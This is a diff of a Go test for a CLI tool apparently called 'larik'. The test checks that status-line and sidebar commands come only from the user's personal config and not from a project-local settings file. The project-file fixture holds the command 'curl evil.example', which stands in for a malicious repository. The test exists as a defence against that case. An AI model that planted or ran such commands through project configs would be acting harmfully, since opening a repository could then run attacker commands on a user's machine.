@@ -657,14 +657,17 @@ func TestStatusLineAndKeybindingsArePersonal(t *testing.T) {
 	cfgHome := t.TempDir()
 	t.Setenv("XDG_CONFIG_HOME", cfgHome)
 	// Claude Code's statusLine spelling, and a key as a single string.
-	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"statusLine":{"type":"command","command":"~/bin/status"},"keybindings":{"external_editor":"ctrl+e","paste_image":["alt+v","ctrl+v"]}}`)
-	write(t, filepath.Join(cwd, ".larik", "settings.json"), `{"status_line":{"command":"curl evil.example"},"keybindings":{"submit":"ctrl+x"}}`)
+	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"statusLine":{"type":"command","command":"~/bin/status","refresh_interval_ms":1500},"sidebar":{"command":"~/.config/larik/sidebar.sh","refresh_interval_ms":750},"keybindings":{"external_editor":"ctrl+e","paste_image":["alt+v","ctrl+v"]}}`)
+	write(t, filepath.Join(cwd, ".larik", "settings.json"), `{"status_line":{"command":"curl evil.example"},"sidebar":{"command":"curl evil.example"},"keybindings":{"submit":"ctrl+x"}}`)
 	cfg, err := Load(cwd)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if cfg.StatusLine == nil || cfg.StatusLine.Command != "~/bin/status" {
+	if cfg.StatusLine == nil || cfg.StatusLine.Command != "~/bin/status" || cfg.StatusLine.RefreshIntervalMS != 1500 {
 		t.Errorf("status line = %+v, want the personal command", cfg.StatusLine)
+	}
+	if cfg.Sidebar == nil || cfg.Sidebar.Command != "~/.config/larik/sidebar.sh" || cfg.Sidebar.RefreshIntervalMS != 750 {
+		t.Errorf("sidebar = %+v, want the personal command", cfg.Sidebar)
 	}
 	if got := cfg.Keybindings["external_editor"]; len(got) != 1 || got[0] != "ctrl+e" {
 		t.Errorf("external_editor = %v", got)
@@ -688,6 +691,10 @@ func TestStatusLineAndKeybindingsArePersonal(t *testing.T) {
 	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"status_line":{"type":"prompt","command":"x"}}`)
 	if _, err := Load(cwd); err == nil {
 		t.Error("an unknown status_line type should be an error")
+	}
+	write(t, filepath.Join(cfgHome, "larik", "config.json"), `{"sidebar":{"command":"x","refresh_interval_ms":100}}`)
+	if _, err := Load(cwd); err == nil {
+		t.Error("an out-of-range sidebar refresh interval should be an error")
 	}
 }
 
